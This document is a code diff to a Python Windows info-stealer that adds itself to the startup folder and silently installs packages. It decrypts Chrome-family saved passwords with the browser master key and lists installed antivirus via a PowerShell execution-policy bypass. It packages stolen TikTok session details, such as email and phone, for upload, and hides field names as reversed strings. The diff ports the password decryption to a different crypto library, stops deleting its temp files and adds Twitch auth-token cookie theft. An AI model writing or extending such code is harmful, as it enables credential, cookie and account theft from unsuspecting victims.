@@ -35,15 +35,15 @@ else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"]
+    ["cryptography", "cryptography"]
 ]
 for modl in requirements:
     try: __import__(modl[0])
     except:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
-
-from Crypto.Cipher import AES
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 import requests
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
@@ -264,11 +264,11 @@ def decrval(buff, master_key=None):
     if starts == 'v10' or starts == 'v11':
         iv = buff[3:15]
         payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        decrypted_pass = decrypted_pass[:-16].decode()
+        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
+        decrypted_pass = decrypted_pass[:-16].decode('utf-8')
         return decrypted_pass
-    
 
 def check_python_or_convert(file_path):
     _, file_extension = os.path.splitext(file_path)
@@ -469,25 +469,33 @@ def systemInfo():
         return 'Error'
 
 def avs():
-    script = r'''
-$filePath = "C:\Users\$env:username\AppData\Local\Temp\winvs.txt"
-if (-not (Test-Path -Path $filePath)) {
-    New-Item -Path $filePath -ItemType File
-}
-Clear-Content -Path $filePath
-Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName" >> $filePath
-'''
+    try:
+        script = r'''
+        $filePath = "C:\Users\$env:username\AppData\Local\Temp\winvs.txt"
+        if (-not (Test-Path -Path $filePath)) {
+            New-Item -Path $filePath -ItemType File
+        }
+        Clear-Content -Path $filePath
+        Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName" >> $filePath
+        '''
 
-    subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass', script])
-        
-    username = os.getlogin()
+        subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass', script], check=True)
 
-    file_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Temp', 'winvs.txt')
+        username = os.getlogin()
 
-    with open(file_path, 'r', encoding='utf-16') as file:
-        content = file.read().strip()
-        
-    return content
+        file_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Temp', 'winvs.txt')
+
+        with open(file_path, 'r', encoding='utf-16') as file:
+            content = file.read().strip()
+
+        return content
+
+    except subprocess.CalledProcessError as e:
+        pass
+    except Exception as e:
+        pass
+
+    return None
 
 
 
@@ -800,37 +808,37 @@ def TikTokSession(cookie):
                             "inline": True
                         },
                         {
-                            "name": "User ID:",
+                            "name": "😊 User ID:",
                             "value": f"`{user_id}`",
                             "inline": True
                         },
                         {
-                            "name": "Email:",
+                            "name": "📧 Email:",
                             "value": f"`{email}`",
                             "inline": True
                         },
                         {
-                            "name": "Phone:",
+                            "name": "📱 Phone:",
                             "value": f"`{phone}`",
                             "inline": True
                         },
                         {
-                            "name": "Username:",
+                            "name": "🥃 Username:",
                             "value": f"`{username}`",
                             "inline": True
                         },
                         {
-                            "name": "Coins:",
+                            "name": "💰 Coins:",
                             "value": f"`{coins}`",
                             "inline": True
                         },
                         {
-                            "name": "Subscriber:",
+                            "name": "🔔 Subscriber:",
                             "value": f"`{subscriber}`",
                             "inline": True
                         },
                         {
-                            "name": "Created at::",
+                            "name": "📅 Created at:",
                             "value": f"`{formatted_date}`",
                             "inline": True
                         },
@@ -1051,7 +1059,8 @@ def uploadTokq(Tokq, path):
         badge = "🔒"
     if not phone: 
         phone = "🔒"
-    if nitro == '' and badge == '': nitro = " -"
+    if hashtag == '0':
+        hashtag = ''
     tok = 'nekoT'
     em = 'liamE'
     data = {
@@ -1472,11 +1481,11 @@ def getPassw(path, arg):
             if starts in ['v10', 'v11']:
                 iv = buff[3:15]
                 payload = buff[15:]
-                cipher = AES.new(master_key, AES.MODE_GCM, iv)
-                decrypted_pass = cipher.decrypt(payload)
-                decrypted_pass = decrypted_pass[:-16].decode()
+                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
+                decryptor = cipher.decryptor()
+                decrypted_pass = decryptor.update(payload) + decryptor.finalize()
+                decrypted_pass = decrypted_pass[:-16].decode('utf-8')
                 return decrypted_pass
-            
         global Passw, PasswCount
         if not os.path.exists(path): return
 
@@ -1964,11 +1973,7 @@ def paaz(filetype):
             file3 = os.getenv("TEMP") + f"\wpautofill.txt"
             file4 = os.getenv("TEMP") + '\winvs.txt'
 
-            ss = [file, file2,file3,file4]
-            for item in ss:
-                try:
-                    os.remove(item)
-                except:pass
+
         except Exception as e:
             pass
 
@@ -2541,6 +2546,17 @@ def cokssite():
                             p.start()
                             threa.append(p)
                             l.append(parts[2])
+                    elif '.twitch.tv' in line:
+                        if 'auth-token' in line:
+                            parts = line.split()
+                            first = parts[2]
+                    elif '.twitch.tv' in line:
+                        if 'name' in line:
+                            parts = line.split()
+                            second = parts[2]
+                    if first != '' and  second != '':
+                        print('test')
+                        first, second = '',''
                 except:
                     pass
                         
